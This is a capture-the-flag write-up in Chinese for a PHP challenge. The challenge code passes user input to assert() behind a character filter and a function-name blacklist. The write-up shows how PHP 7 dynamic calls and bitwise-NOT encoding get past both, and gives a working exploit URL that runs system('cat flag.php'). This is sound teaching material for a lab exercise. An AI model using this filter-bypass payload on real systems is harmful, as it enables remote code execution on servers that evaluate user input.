# hate_php

```php
<?php
error_reporting(0);
if(!isset($_GET['code'])){
    highlight_file(__FILE__);
}else{
    $code = $_GET['code'];
    if (preg_match('/(f|l|a|g|\.|p|h|\/|;|\"|\'|\`|\||\[|\]|\_|=)/i',$code)) { 
        die('You are too good for me'); 
    }
    $blacklist = get_defined_functions()['internal'];
    foreach ($blacklist as $blackitem) { 
        if (preg_match ('/' . $blackitem . '/im', $code)) { 
            die('You deserve better'); 
        } 
    }
    assert($code);
}
```

P师傅博客中提过PHP7前是不允许用`($a)();`这样的方法来执行动态函数的，但PHP7中增加了对此的支持。所以，我们可以通过`('phpinfo')();`来执行函数，第一个括号中可以是任意PHP表达式。

`(~%8F%97%8F%96%91%99%90)();`即可执行phpinfo，所以仿照构造exp

```php
<?php
echo urlencode(~'system');
echo '------';
echo urlencode(~'cat flag.php');

--------
%8C%86%8C%8B%9A%92------%9C%9E%8B%DF%99%93%9E%98%D1%8F%97%8F
```

最终exp:

```http
http://localhost/?code=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%93%9E%98%D1%8F%97%8F)
```

flag为`flag{9d30951bedb2625476e799268d6c05dc}`